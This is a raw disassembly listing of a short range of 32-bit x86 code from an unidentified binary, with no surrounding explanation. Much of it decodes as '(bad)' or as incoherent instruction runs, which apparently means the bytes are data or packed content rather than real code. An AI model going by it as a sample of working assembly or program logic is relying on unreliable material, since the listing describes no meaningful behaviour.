  41d374:	ror    esp,0xff
  41d377:	(bad)  
  41d379:	fiadd  DWORD PTR ds:0xf483bd89
  41d37f:	inc    DWORD PTR ds:0x98300c8
  41d385:	add    ah,cl
  41d387:	dec    ebx
  41d388:	inc    eax
  41d38a:	add    BYTE PTR [ebx-0x76f67ce7],0x5d
  41d391:	(bad)  
  41d392:	inc    DWORD PTR [eax]
  41d394:	push   ecx
  41d395:	cmp    edi,0x76
  41d398:	mov    DWORD PTR [esi-0xaf00c2],esp
  41d39e:	mov    ?,edi
  41d3a0:	std    
  41d3a1:	and    DWORD PTR [ebx+0xffdcff],eax
  41d3a7:	rol    BYTE PTR [eax],cl
  41d3a9:	(bad)  
  41d3aa:	mov    ch,0xff
  41d3ac:	repz add BYTE PTR [ebx+0x52dcc],ah
  41d3b3:	cmp    ebx,0x0
  41d3b6:	jmp    DWORD PTR ds:0xff529eff
  41d3bc:	mov    ah,0xff
  41d3be:	dec    ecx
  41d3bf:	xor    esi,0xffffffa4
  41d3c2:	add    bh,bh
  41d3c4:	pop    es
  41d3c5:	add    ah,cl
  41d3c7:	sub    al,0xff
  41d3c9:	imul   BYTE PTR [eax-0x1]
  41d3cc:	inc    esp
  41d3cd:	sub    DWORD PTR [ecx],0xffffffcc
  41d3d0:	inc    esp
  41d3d1:	lock add ah,cl
  41d3d4:	cmp    eax,0xff1aff00
  41d3d9:	fstp   QWORD PTR [edi+0x7c00a100]
  41d3df:	call   eax
  41d3e1:	in     al,dx
  41d3e2:	(bad)  
  41d3e3:	push   DWORD PTR ds:0x600cc
  41d3e9:	push   es
  41d3ea:	cld    
  41d3eb:	push   DWORD PTR [ecx]
  41d3ed:	call   DWORD PTR [ebx-0xda6a00]
  41d3f3:	xor    eax,0xffffffff
  41d3f6:	sbb    DWORD PTR [ebx+eax*4],0xffffff9e
  41d3fa:	sbb    edi,edi
  41d3fc:	es add ah,bl
  41d3ff:	add    BYTE PTR [ebx],dl
  41d401:	mov    al,0xff
  41d403:	add    bl,ch
  41d405:	int3   
  41d406:	int3   
  41d407:	sar    edi,cl
  41d409:	scas   eax,DWORD PTR es:[edi]
  41d40a:	mov    esi,0x94834aff
  41d40f:	jmp    FWORD PTR [edi]
  41d411:	mov    eax,0xffd30000
  41d416:	push   DWORD PTR [eax]
  41d418:	add    BYTE PTR [edi-0x11760a],ah
  41d41e:	adc    al,0x83
  41d420:	(bad)  
  41d422:	add    BYTE PTR [eax],al
  41d424:	mov    BYTE PTR [ebx-0x1eff0f00],al
  41d42a:	outs   dx,DWORD PTR ds:[esi]
  41d42b:	add    BYTE PTR [ecx-0x57002201],bl
  41d431:	jae    0x41d432
  41d433:	(bad)  
  41d434:	stc    
  41d435:	(bad)  
  41d436:	call   FWORD PTR [ebx-0x7d]
  41d439:	loopne 0x41d41a
  41d43b:	sub    DWORD PTR [edi+0x0],0x35
  41d43f:	add    BYTE PTR [esi+0x3cff00be],bl
  41d445:	dec    esp
  41d447:	or     bh,bh
  41d449:	pop    esp
  41d44a:	out    dx,eax
  41d44b:	add    BYTE PTR [edi+0x1e00a9ff],ch
  41d451:	jno    0x41d452
  41d453:	add    BYTE PTR [eax-0x50001],ch
  41d459:	js     0x41d45c
  41d45b:	sbb    DWORD PTR [esi+0x2500a189],0x66
  41d462:	or     DWORD PTR [ecx-0x4933007d],0x0
  41d469:	ror    DWORD PTR [edx-0x77],cl
  41d46c:	(bad)  
  41d46d:	dec    DWORD PTR [ebx+0x90fbff]
  41d473:	push   ecx
  41d475:	add    bh,bh
  41d477:	scas   eax,DWORD PTR es:[edi]
  41d478:	add    ch,al
  41d47a:	stos   BYTE PTR es:[edi],al
  41d47b:	(bad)  
  41d47c:	fiadd  WORD PTR [eax]
  41d47e:	adc    bh,bh
  41d480:	sbb    al,0x4f
  41d482:	mov    esp,ecx
  41d484:	repz (bad) 
  41d486:	jmp    DWORD PTR [edi+0x0]
  41d489:	dec    ecx
  41d48a:	push   esi
  41d48b:	call   FWORD PTR [eax+eax*1]
  41d48e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d48f:	int3   
  41d490:	push   esp
  41d491:	pop    eax
  41d492:	cmp    edi,0x75
  41d495:	(bad)  
  41d496:	call   FWORD PTR [ebx]
  41d498:	mov    DWORD PTR [edx-0x29],esi
  41d49b:	(bad)  
  41d49c:	jns    0x41d49e
  41d49e:	push   edi
  41d49f:	call   DWORD PTR [ebp+0xb]
  41d4a2:	add    bh,bh
  41d4a4:	(bad)  
  41d4a5:	(bad)  
  41d4a6:	call   DWORD PTR [edx-0x479900]
  41d4ac:	dec    eax
  41d4ad:	add    BYTE PTR [esi-0x1],al
  41d4b0:	push   cs
  41d4b1:	icebp  
  41d4b2:	dec    DWORD PTR [ecx-0x5fffffc8]
  41d4b8:	jmp    DWORD PTR [ecx-0x26]
  41d4bb:	call   FWORD PTR [edi-0x30001f01]
  41d4c1:	(bad)  
  41d4c2:	int3   
  41d4c3:	(bad)  
  41d4c4:	jnp    0x41d4c6
  41d4c6:	(bad)  
  41d4c7:	std    
  41d4c8:	(bad)  
  41d4c9:	cmp    eax,0xda89e4
  41d4ce:	xor    al,0xff
  41d4d0:	cmp    eax,0xe2ff00df
  41d4d5:	inc    DWORD PTR [eax]
  41d4d7:	push   ecx
  41d4d8:	(bad)  
  41d4d9:	cld    
  41d4da:	iret   
  41d4db:	add    BYTE PTR [ecx],ah
  41d4dd:	mov    DWORD PTR [edx-0xae6c01],esp
  41d4e3:	inc    esp
  41d4e5:	mov    DWORD PTR [eax],eax
  41d4e7:	mov    bh,0xcc
  41d4e9:	pushf  
  41d4ea:	ror    ah,cl
  41d4ec:	jg     0x41d4ed
  41d4ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4ef:	jmp    esi
  41d4f1:	xor    DWORD PTR [ebx-0xed7d],eax
  41d4f7:	add    al,0xff
  41d4f9:	and    eax,0xff5e0087
  41d4fe:	inc    edx
  41d4ff:	(bad)  
  41d500:	cmp    ch,BYTE PTR [edi+edi*8-0x1]
  41d504:	aas    
  41d505:	dec    DWORD PTR [ecx+0x16b6ff9e]
  41d50b:	jmp    DWORD PTR [ebx-0x77]
  41d50e:	and    al,0xff
  41d510:	pushf  
  41d511:	inc    BYTE PTR [eax]
  41d513:	push   DWORD PTR [edx-0x7ce70100]
  41d519:	inc    ebx
  41d51a:	adc    eax,0x2ccc09ff
  41d51f:	(bad)  
  41d520:	(bad)  
  41d521:	cld    
  41d522:	add    bh,bh
  41d524:	fild   DWORD PTR [ebx-0x5c763100]
  41d52a:	mov    ebp,0x328304ff
  41d52f:	add    BYTE PTR [ecx-0x5200ff8f],bl
  41d535:	add    bh,bh
  41d537:	sbb    al,0xff
  41d539:	or     BYTE PTR [ebp+0x28890eff],dh
  41d53f:	xor    DWORD PTR [esi+0x3aff89ac],0x0
  41d546:	mov    DWORD PTR [ecx-0x1],edi
  41d549:	cmc    
  41d54a:	mov    ebp,0x6afffd83
  41d54f:	int3   
  41d550:	adc    BYTE PTR [ebp+0x0],0x83
  41d554:	outs   dx,DWORD PTR ds:[esi]
  41d555:	add    ah,cl
  41d557:	mov    al,BYTE PTR [eax]
  41d559:	and    al,0xa1
  41d55b:	inc    DWORD PTR [edi+0x0]
  41d55e:	cmp    bh,bh
  41d560:	mov    ds:0x5affffa6,eax
  41d565:	add    BYTE PTR [ebx-0x466033ca],al
  41d56b:	dec    DWORD PTR ds:0x7fff200
  41d571:	xchg   esi,eax
  41d572:	add    bh,bh
  41d574:	jns    0x5341407a
  41d57a:	sub    bh,bh
  41d57c:	fwait
  41d57d:	xor    ebp,0xffffff83
  41d580:	in     eax,0x4e
  41d582:	(bad)  
  41d583:	jmp    DWORD PTR [eax-0x1]
  41d586:	sbb    DWORD PTR [esi-0x7672ed01],0xffffff9f
  41d58d:	push   DWORD PTR [ebx]
  41d58f:	add    BYTE PTR [ebx],dl
  41d591:	pop    edx
  41d592:	add    DWORD PTR [eax],0xffffffef
  41d595:	(bad)  
  41d596:	inc    ebp
  41d598:	call   FWORD PTR [ecx]
  41d59a:	pop    ebp
  41d59b:	add    BYTE PTR [eax+eax*1+0x46],cl
  41d59f:	dec    DWORD PTR [esi-0x32ff33b2]
  41d5a5:	inc    DWORD PTR [eax]
  41d5a7:	sbb    DWORD PTR gs:[ebx+ebx*2+0x22ffbbff],0x0
  41d5b0:	js     0x41d5e1
  41d5b2:	(bad)  
  41d5b3:	call   esp
  41d5b5:	add    bh,bh
  41d5b7:	xor    bh,bh
  41d5b9:	fs or  eax,0x51ffc6ff
  41d5bf:	call   FWORD PTR [esi]
  41d5c1:	or     edi,edi
  41d5c3:	add    BYTE PTR [ebx],ah
  41d5c5:	(bad)  
  41d5c6:	(bad)  
  41d5c7:	clc    
  41d5c8:	add    BYTE PTR [esi],cl
  41d5ca:	adc    DWORD PTR [ebx-0xd400e3],eax
  41d5d0:	push   ecx
  41d5d1:	test   DWORD PTR [ebx-0xfa00],eax
  41d5d7:	rol    DWORD PTR [ebx+0x4cc5ec4],0x83
  41d5de:	sbb    al,0x0
  41d5e0:	inc    DWORD PTR [edi]
  41d5e2:	(bad)  
  41d5e3:	(bad)  
  41d5e4:	mov    edi,0x60cc00
  41d5e9:	lds    edi,FWORD PTR ds:0xd5ff53ff
  41d5ef:	(bad)  
  41d5f0:	mov    edx,0x5000ff28
  41d5f5:	add    ah,cl
  41d5f7:	inc    ebp
  41d5f8:	sbb    DWORD PTR [eax],0x22
  41d5fb:	mov    DWORD PTR [ecx-0x55007701],edi
  41d601:	arpl   WORD PTR [eax],ax
  41d603:	inc    DWORD PTR [ecx-0x9cff01]
  41d609:	int    0x27
  41d60b:	call   DWORD PTR [edx+0x61ff84ff]
  41d611:	jbe    0x41d596
  41d613:	add    cl,cl
  41d615:	add    bh,bh
  41d617:	push   ecx
  41d618:	int3   
  41d619:	into   
  41d61a:	inc    ebp
  41d61b:	(bad)  
  41d61c:	clc    
  41d61d:	sbb    DWORD PTR [ebx+eax*4],0xfffffffe
  41d621:	clc    
  41d622:	dec    DWORD PTR [ecx+0xd00833c]
  41d628:	int3   
  41d629:	sbb    ebp,DWORD PTR [eax+eax*1-0x7c3b7c8a]
  41d630:	int    0x38
  41d632:	inc    DWORD PTR [eax]
  41d634:	mov    ah,0x0
  41d636:	add    edi,0x0
  41d639:	mov    ds:0xcc64ff89,al
  41d63e:	rol    BYTE PTR [eax],1
  41d640:	pop    ecx
  41d641:	out    dx,al
  41d642:	add    bh,bh
  41d644:	(bad)  
  41d645:	int3   
  41d646:	mov    DWORD PTR [edx-0x1],ebx
  41d649:	aas    
  41d64a:	fild   WORD PTR [eax]
  41d64c:	repz add BYTE PTR [eax+eax*1+0x3c],dl
  41d651:	cmp    edi,0xff005000
  41d657:	fmul   QWORD PTR [ecx-0x100beb9]
  41d65d:	add    al,bl
  41d65f:	dec    DWORD PTR [ebp+0x45]
  41d662:	inc    DWORD PTR [eax]
  41d664:	mov    dl,0xff
  41d666:	call   DWORD PTR [ecx]
  41d668:	int3   
  41d669:	sti    
  41d66a:	xchg   esp,eax
  41d66b:	mov    edx,edx
  41d66d:	add    BYTE PTR [eax-0x1],bh
  41d670:	mov    edi,ss
  41d672:	inc    DWORD PTR [eax]
  41d674:	lds    eax,FWORD PTR [ebx-0x35006601]
  41d67a:	mov    bh,bh
  41d67c:	mov    eax,ds:0xc3ff0800
  41d681:	dec    esp
  41d682:	add    BYTE PTR [ebx+0x12ff0064],al
  41d688:	int3   
  41d689:	sbb    edx,DWORD PTR [edi-0x7d]
  41d68c:	xor    bh,bh
  41d68e:	js     0x41d690
  41d690:	sub    bl,bh
  41d692:	dec    esp
  41d694:	push   ebx
  41d695:	(bad)  
  41d696:	call   DWORD PTR [edx-0x1]
  41d699:	xor    DWORD PTR [edi],ebx
  41d69b:	add    BYTE PTR [edi+edi*8],bh
  41d69e:	jmp    0x11ec8a3
  41d6a3:	or     edx,0x0
  41d6a6:	call   edi
  41d6a8:	jmp    DWORD PTR [edx]
  41d6aa:	jnp    0x41d6ab
  41d6ac:	push   ebp
  41d6ad:	mov    DWORD PTR [edi+edi*8],ebp
  41d6b0:	dec    eax
  41d6b1:	pop    ebp
  41d6b2:	add    DWORD PTR [eax],0xffffffd1
  41d6b5:	add    BYTE PTR [eax],al
  41d6b7:	cli    
  41d6b8:	add    BYTE PTR [ecx+0x33],dh
  41d6bb:	add    BYTE PTR [esi+0x22007c00],dh
  41d6c1:	arpl   di,di
  41d6c3:	int3   
  41d6c4:	jmp    0x229c:0x83d7ff00
  41d6cb:	push   ebp
  41d6cd:	add    BYTE PTR [ebx-0x7c3d5c7d],bl
  41d6d3:	mov    esp,edi
  41d6d5:	inc    DWORD PTR [ebx-0x1222004d]
  41d6db:	add    BYTE PTR [eax],dh
  41d6dd:	add    BYTE PTR [edx],bh
  41d6df:	(bad)  
  41d6e0:	mov    eax,0x18ccff39
  41d6e5:	int3   
  41d6e6:	add    BYTE PTR [esi-0x36d301],ch
  41d6ec:	out    dx,eax
  41d6ed:	add    BYTE PTR [eax-0x34],cl
  41d6f0:	mov    ebp,0xf3ff0086
  41d6f5:	add    BYTE PTR [ecx+0x423100f6],cl
  41d6fb:	add    bh,al
  41d6fd:	jmp    FWORD PTR [esi-0x2e4c01]
  41d703:	xor    ecx,0x0
  41d706:	int3   
  41d707:	imul   edi,edi,0x70
  41d70a:	(bad)  
  41d70b:	(bad)  
  41d70c:	stc    
  41d70d:	add    BYTE PTR [ebp-0x7cf97d77],ah
  41d713:	add    BYTE PTR [esi-0x1],al
  41d716:	add    BYTE PTR [edx-0x1],bh
  41d719:	lods   eax,DWORD PTR ds:[esi]
  41d71a:	(bad)  
  41d71c:	xchg   edx,eax
  41d71d:	int3   
  41d71e:	aas    
  41d71f:	dec    DWORD PTR [edi-0x5d007c08]
  41d725:	mov    edi,edi
  41d727:	fdivr  st,st(7)
  41d729:	sub    esp,DWORD PTR [edi-0x1]
  41d72c:	aas    
  41d72d:	add    BYTE PTR [edi+edi*8-0x33f47c],al
  41d734:	out    dx,al
  41d735:	inc    DWORD PTR [eax]
  41d737:	sub    eax,0x89d5ff83
  41d73c:	mov    eax,0x2bff7c00
  41d741:	sub    al,0x0
  41d743:	mov    DWORD PTR [ebp+0x0],ebx
  41d746:	add    BYTE PTR [esi+0x0],bl
  41d749:	(bad)  
  41d74b:	dec    DWORD PTR [esi-0x34]
  41d74e:	dec    ebx
  41d74f:	int3   
  41d750:	add    al,0x0
  41d753:	jmp    DWORD PTR ds:0xba8300
  41d759:	lea    edi,[esi]
  41d75b:	add    ch,cl
  41d75d:	add    ch,cl
  41d75f:	int3   
  41d760:	cmp    BYTE PTR [ecx],al
  41d762:	(bad)  
  41d763:	jmp    FWORD PTR [esi-0xcd0001]
  41d769:	add    dl,al
  41d76b:	jmp    DWORD PTR [eax-0x77]
  41d76e:	mov    edi,edi
  41d770:	push   esi
  41d771:	iret   
  41d772:	add    BYTE PTR [ebx-0x45ffff37],al
  41d778:	add    BYTE PTR [edi-0x7c917cb8],bl
  41d77e:	sahf   
  41d77f:	inc    DWORD PTR [edi-0x21]
  41d782:	cmp    edi,0xffffff98
  41d785:	(bad)  
  41d786:	(bad)  
  41d787:	cmp    bh,bh
  41d789:	data16 ja 0x41d78c
  41d78c:	ret    0x9d83
  41d78f:	add    ah,ah
  41d791:	jno    0x41d793
  41d793:	(bad)  
  41d794:	jmp    0x275b98
  41d799:	push   0xffffffa0
  41d79b:	(bad)  
  41d79c:	jmp    0x93:0x8a835fff
  41d7a3:	(bad)  
  41d7a4:	cmp    eax,0xff2300ff
  41d7a9:	pop    ds
  41d7aa:	push   edi
  41d7ab:	and    ecx,0xffffffff
  41d7ae:	call   0xfff824b2
  41d7b3:	add    BYTE PTR [eax],cl
  41d7b5:	add    BYTE PTR [ebx+0x3425ff57],al
  41d7bb:	call   DWORD PTR [eax-0x34]
  41d7be:	pop    esp
  41d7bf:	mov    DWORD PTR [ebx-0x2a],ebp
  41d7c2:	inc    DWORD PTR [eax]
  41d7c4:	dec    esi
  41d7c5:	inc    DWORD PTR [eax]
  41d7c7:	(bad)  
  41d7c8:	call   FWORD PTR [ebp+eiz*2+0x4800b2ff]
  41d7cf:	jmp    DWORD PTR ds:0x97ffff2c
  41d7d5:	mov    edi,edi
  41d7d7:	repnz (bad) 
  41d7d9:	fld    QWORD PTR [esi]
  41d7db:	jmp    FWORD PTR [ebp-0x1]
  41d7de:	xor    edi,edi
  41d7e0:	push   ds
  41d7e1:	add    edi,edi
  41d7e3:	inc    esi
  41d7e5:	inc    DWORD PTR [eax]
  41d7e7:	ins    BYTE PTR es:[edi],dx
  41d7e8:	and    ebx,0x52
  41d7eb:	add    BYTE PTR [ebp-0x21ff3701],bl
  41d7f1:	inc    ebp
  41d7f2:	int3   
  41d7f3:	(bad)  
  41d7f4:	fmul   DWORD PTR [ecx-0x2c7c4300]
  41d7fa:	mov    ebp,0xf700dacc
  41d7ff:	add    BYTE PTR [edx+0x26],dl
  41d802:	add    DWORD PTR [eax],0xffffffaa
  41d805:	inc    DWORD PTR [ebx-0x69c0075]
  41d80b:	add    BYTE PTR [edx-0x1],bl
  41d80e:	dec    ebx
  41d80f:	add    al,bl
  41d811:	or     al,BYTE PTR [eax]
  41d813:	dec    DWORD PTR [ebx]
  41d815:	mov    DWORD PTR [eax],eax
  41d817:	aam    0x0
  41d819:	stos   DWORD PTR es:[edi],eax
  41d81a:	sub    edi,edi
  41d81c:	adc    al,0x83
  41d81e:	xor    eax,DWORD PTR [ebx-0x76ff01b0]
  41d824:	daa    
  41d825:	int3   
  41d826:	jmp    edx
  41d828:	add    BYTE PTR [esi],al
  41d82a:	or     ah,0x5b
  41d82d:	(bad)  
  41d82e:	mov    ecx,0xffec1a00
  41d833:	add    BYTE PTR [edx-0x33da007d],ch
  41d839:	xchg   edx,eax
  41d83a:	push   esi
  41d83b:	jmp    DWORD PTR [ebp-0x34]
  41d83e:	(bad)  
  41d840:	dec    ebx
  41d841:	pop    es
  41d842:	add    bh,bh
  41d844:	adc    al,BYTE PTR [eax]
  41d846:	mov    DWORD PTR ds:0x6b2cff,esp
  41d84c:	loope  0x41d7d7
  41d84e:	imul   eax,DWORD PTR [eax],0x89d7e2
  41d854:	push   cs
  41d855:	add    DWORD PTR [eax],0xffffffae
  41d858:	mov    edi,esi
  41d85a:	sub    al,BYTE PTR [eax]
  41d85c:	pop    ebp
  41d85d:	jmp    FWORD PTR [ecx+0x4191ff]
  41d863:	xor    DWORD PTR [ecx],0x0
  41d866:	jmp    FWORD PTR ds:0xff2f5000
  41d86c:	mov    eax,DWORD PTR [eax]
  41d86e:	cmp    edi,edi
  41d870:	js     0x41d83d
  41d872:	inc    DWORD PTR [eax]
  41d874:	outs   dx,BYTE PTR ds:[esi]
  41d875:	add    BYTE PTR [ebx+0xeddffae],al
  41d87b:	mov    DWORD PTR [esi-0x7d],ecx
  41d87e:	lods   al,BYTE PTR ds:[esi]
  41d87f:	call   DWORD PTR [ecx]
  41d881:	out    0xff,al
  41d883:	add    bh,ch
  41d885:	(bad)  
  41d886:	push   DWORD PTR [ebp+0x583aff]
  41d88c:	ror    esp,1
  41d88e:	int3   
  41d88f:	push   esi
  41d891:	inc    edx
  41d892:	(bad)  
  41d893:	jmp    DWORD PTR [ebp-0x7d]
  41d896:	jmp    FWORD PTR [ecx-0x1ec001]
  41d89c:	sbb    edi,edi
  41d89e:	xor    BYTE PTR [ecx-0xca5a],cl
  41d8a4:	mov    ebp,0xffd4ffff
  41d8a9:	mov    ecx,0xc6ff02
  41d8ae:	inc    esp
  41d8af:	(bad)  
  41d8b0:	ds pop ss
  41d8b2:	add    DWORD PTR [ebx+0xa83ffdc],0xffffffff
  41d8b9:	adc    bh,BYTE PTR [esi]
  41d8bb:	call   FWORD PTR [ebx]
  41d8bd:	call   FWORD PTR [ebp-0x1]
  41d8c0:	cmp    eax,0x48000039
  41d8c5:	dec    esp
  41d8c7:	pop    ds
  41d8c8:	add    ecx,0x64
  41d8cb:	add    BYTE PTR [eax+eax*1-0x2d],bh
  41d8cf:	add    BYTE PTR [edx+0x4700ff5d],ch
  41d8d5:	add    BYTE PTR [eax],al
  41d8d7:	pop    es
  41d8d8:	add    BYTE PTR [ebx-0xea0087],bh
  41d8de:	xor    bh,bh
  41d8e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8e1:	sahf   
  41d8e2:	add    BYTE PTR [eax],al
  41d8e4:	jno    0x41d8e5
  41d8e6:	add    DWORD PTR [edx+0x59edff],0xffffff8f
  41d8ed:	add    BYTE PTR [eax],dh
  41d8ef:	int3   
  41d8f0:	iret   
  41d8f1:	or     al,0xcc
  41d8f3:	mov    DWORD PTR [edi],eax
  41d8f5:	mov    DWORD PTR [ecx-0x7193764f],ecx
  41d8fb:	mov    DWORD PTR [ebx+0x29cc64ff],edx
  41d901:	mov    cl,0xff
  41d903:	dec    DWORD PTR [eax-0x7d]
  41d906:	call   DWORD PTR [esi]
  41d908:	and    DWORD PTR [ebx-0x7c270040],0x51
  41d90f:	add    BYTE PTR [eax-0x3b33ffc7],dh
  41d915:	(bad)  
  41d916:	inc    DWORD PTR ds:0xff365f83
  41d91c:	aad    0x83
  41d91e:	scas   eax,DWORD PTR es:[edi]
  41d91f:	inc    eax
  41d921:	mov    edi,edi
  41d923:	add    BYTE PTR [edx],ah
  41d925:	add    BYTE PTR [ebx+0x2d7fffd6],al
  41d92b:	sub    DWORD PTR [ebx-0x1],0xffffffa5
  41d92f:	call   DWORD PTR [ecx+0x13]
  41d932:	inc    DWORD PTR [ebx+0x2bffccce]
  41d938:	add    ch,dl
  41d93a:	sbb    eax,0x2dff1dff
  41d93f:	dec    ecx
  41d941:	out    0x83,al
  41d943:	add    BYTE PTR [edi],cl
  41d945:	or     esp,0x7
  41d948:	add    BYTE PTR [ebp+0x76],al
  41d94b:	call   FWORD PTR [eax+0x0]
  41d94e:	jb     0x41d950
  41d950:	push   0x7b
  41d952:	add    BYTE PTR [ecx+0x55ffff15],cl
  41d958:	call   DWORD PTR [eax-0x4200ec]
  41d95e:	fxch   st(4)
  41d960:	mov    eax,0xd3ffff31
  41d965:	(bad)  
  41d966:	inc    esi
  41d968:	int3   
  41d969:	icebp  
  41d96a:	sbb    eax,0x97002fff
  41d96f:	mov    DWORD PTR [eax+0x3c83cc2a],ebp
  41d975:	inc    DWORD PTR [ebx+0x8c6003a]
  41d97b:	or     DWORD PTR [esi+0x0],0xffffffa3
  41d97f:	inc    DWORD PTR [edx+0x55]
  41d982:	dec    esp
  41d984:	pop    ss
  41d985:	add    DWORD PTR [ebx-0x1a6600ea],0x0
  41d98c:	adc    bh,bh
  41d98e:	loopne 0x41d990
  41d990:	cdq    
  41d991:	sub    edi,edi
  41d993:	sub    DWORD PTR [ecx-0x60001],0x73
  41d99a:	mov    es,WORD PTR [eax]
  41d99c:	push   0x48ff48ff
  41d9a1:	push   ss
  41d9a2:	(bad)  
  41d9a3:	call   FWORD PTR ds:0xff4d8300
  41d9a9:	inc    ebp
  41d9aa:	(bad)  
  41d9ab:	push   DWORD PTR [esi]
  41d9ad:	int3   
  41d9ae:	aas    
  41d9af:	xor    DWORD PTR [edx+0x53000003],0xffffff83
  41d9b6:	(bad)  
  41d9b7:	stc    
  41d9b8:	mov    DWORD PTR [ebp-0x77ff9c],esp
  41d9be:	lahf   
  41d9bf:	dec    DWORD PTR [edi+0x1c]
  41d9c2:	(bad)  
  41d9c3:	push   ebp
  41d9c5:	add    BYTE PTR [ebx-0x7fbcffd1],al
  41d9cb:	xor    DWORD PTR [esi-0x117c5601],0x42
  41d9d2:	cmp    edi,0x14
  41d9d5:	dec    esp
  41d9d7:	gs add ch,dl
  41d9da:	pop    ss
  41d9db:	xor    DWORD PTR [ebx-0x4b7c2d01],0x3c
  41d9e2:	(bad)  
  41d9e3:	push   DWORD PTR [esi+0x0]
  41d9e6:	add    BYTE PTR [esi-0x6ae401],bl
  41d9ec:	adc    eax,DWORD PTR [eax]
  41d9ee:	retf   
  41d9ef:	jmp    DWORD PTR [ecx]
  41d9f1:	add    BYTE PTR [ebx-0x7c00017d],0xb9
  41d9f8:	add    BYTE PTR [edi+0x40],al
  41d9fb:	(bad)  
  41d9fc:	fild   DWORD PTR [eax]
  41d9fe:	mov    ebp,0xfff05fff
  41da03:	int3   
  41da04:	jl     0x41da05
  41da06:	inc    DWORD PTR [esi-0x1]
  41da09:	mul    BYTE PTR [eax]
  41da0b:	dec    DWORD PTR [ebp+0x64ff6ccc]
  41da11:	or     BYTE PTR [ecx-0x33e577],0xf7
  41da18:	push   DWORD PTR [ecx-0xa57c66]
  41da1e:	xor    eax,DWORD PTR [eax]
  41da20:	popf   
  41da21:	jo     0x41da22
  41da23:	int3   
  41da24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da25:	add    ah,cl
  41da27:	cmc    
  41da28:	add    BYTE PTR [eax+0x12],ch
  41da2b:	xor    DWORD PTR [edi],0x0
  41da2e:	dec    esp
  41da2f:	add    cl,dl
  41da31:	jg     0x41da32
  41da33:	add    al,ah
  41da35:	add    bh,bh
  41da37:	pusha  
  41da38:	and    DWORD PTR [edi-0x64],0xffffffff
  41da3c:	aas    
  41da3d:	add    ebp,0xffffffff
  41da40:	jp     0x41d9dc
  41da42:	inc    DWORD PTR [ebx+0x36ff831b]
  41da48:	cmp    ebp,0x31
  41da4b:	add    BYTE PTR [esi+0x0],dl
  41da4e:	test   eax,0xce50ff
  41da53:	int3   
  41da54:	inc    eax
  41da55:	cmp    edi,0xffffffc2
  41da58:	jmp    edi
  41da5a:	ret    
  41da5b:	jmp    DWORD PTR [esi]
  41da5d:	adc    DWORD PTR [esi-0x7cb58701],0x0
  41da64:	dec    ebp
  41da65:	(bad)  
  41da66:	(bad)  
  41da67:	mov    ebx,0xc64bcc
  41da6c:	jne    0x41d9f1
  41da6e:	mov    edi,edi
  41da70:	call   0xb042d9d7
  41da75:	(bad)  
  41da76:	dec    DWORD PTR [edx]
  41da78:	add    cl,ah
  41da7a:	dec    BYTE PTR [ecx-0xa5ff4b]
  41da80:	(bad)  
  41da82:	(bad)  
  41da83:	(bad)  
  41da84:	cld    
  41da85:	inc    DWORD PTR [eax]
  41da87:	sub    al,0x83
  41da89:	mov    ebp,0xff30008d
  41da8e:	xchg   esp,eax
  41da8f:	(bad)  
  41da90:	js     0x41da67
  41da92:	add    DWORD PTR [ebx-0x6dff00aa],0xffffff89
  41da99:	sub    ebp,ecx
  41da9b:	inc    DWORD PTR [edi+0x2e894fcc]
  41daa1:	(bad)  
  41daa3:	call   FWORD PTR [edi+edi*8-0x627cc701]
  41daaa:	mov    eax,0xb1ff8283
  41daaf:	inc    DWORD PTR [eax-0x60]
  41dab2:	add    BYTE PTR [ecx-0x27ff76e6],cl
  41dab8:	jmp    DWORD PTR [edx]
  41daba:	pop    ebp
  41dabb:	add    ah,bh
  41dabd:	int3   
  41dabe:	mov    esi,0xcc7101cc
  41dac3:	mov    DWORD PTR [eax],esi
  41dac5:	add    DWORD PTR [ebx+0x4d48ff43],0x0
  41dacc:	aas    
  41dacd:	add    BYTE PTR [eax-0x7c7c3e00],dl
  41dad3:	mov    DWORD PTR [ecx-0x7c430001],edx
  41dad9:	test   eax,0xa8006a
  41dade:	out    dx,eax
  41dadf:	call   esi
  41dae1:	push   edi
  41dae2:	add    bh,bh
  41dae4:	(bad)  
  41dae6:	dec    DWORD PTR [ebp-0x34]
  41dae9:	repnz or bh,bh
  41daec:	loope  0x41da71
  41daee:	xchg   esp,eax
  41daef:	add    al,al
  41daf1:	inc    esp
  41daf2:	(bad)  
  41daf3:	inc    DWORD PTR [ecx]
  41daf5:	add    bh,bh
  41daf7:	inc    ecx
  41daf8:	add    BYTE PTR [ebp-0x7c64769f],dl
  41dafe:	scas   al,BYTE PTR es:[edi]
  41daff:	dec    DWORD PTR [ecx]
  41db01:	mov    esi,0x5c8383
  41db06:	push   DWORD PTR [eax+eax*1]
  41db09:	add    ecx,edi
  41db0b:	int3   
  41db0c:	scas   eax,DWORD PTR es:[edi]
  41db0d:	add    BYTE PTR [edx+0xc5b5ff],ch
  41db13:	inc    ecx
  41db15:	add    BYTE PTR [ebx-0x1a7a00ef],al
  41db1b:	add    BYTE PTR [edx-0x7d],cl
  41db1e:	lds    eax,FWORD PTR [eax]
  41db20:	rcr    dh,cl
  41db22:	(bad)  
  41db23:	inc    DWORD PTR [edi-0xbeff34]
  41db29:	push   cs
  41db2a:	add    BYTE PTR ss:[esi+0x1e83e2ff],bl
  41db31:	enter  0xffff,0x72
  41db35:	add    BYTE PTR [eax],al
  41db37:	in     al,dx
  41db38:	push   DWORD PTR [edx+0x75]
  41db3b:	jmp    DWORD PTR [esi-0x1]
  41db3e:	repz jmp FWORD PTR [edx+0x14000046]
  41db45:	add    bh,bh
  41db47:	dec    ebp
  41db48:	call   FWORD PTR [esi+0x14ffda]
  41db4e:	xchg   BYTE PTR [ebx-0x335c43],al
  41db54:	(bad)  
  41db55:	(bad)  
  41db56:	inc    DWORD PTR [edx]
  41db58:	inc    edi
  41db5a:	retf   
  41db5b:	add    BYTE PTR [ebx-0x56002134],cl
  41db61:	inc    WORD PTR [ebx+0x51ccffae]
  41db68:	dec    esi
  41db6a:	dec    DWORD PTR ds:0x74cc0c00
  41db71:	pop    DWORD PTR [eax]
  41db73:	push   DWORD PTR [edi-0x1]
  41db76:	add    BYTE PTR [eax-0x914700],cl
  41db7c:	and    DWORD PTR [eax],eax
  41db7e:	fdivp  st(7),st
  41db80:	dec    edx
  41db81:	in     al,dx
  41db82:	inc    DWORD PTR [eax]
  41db84:	and    ecx,DWORD PTR [ecx+0x64005aff]
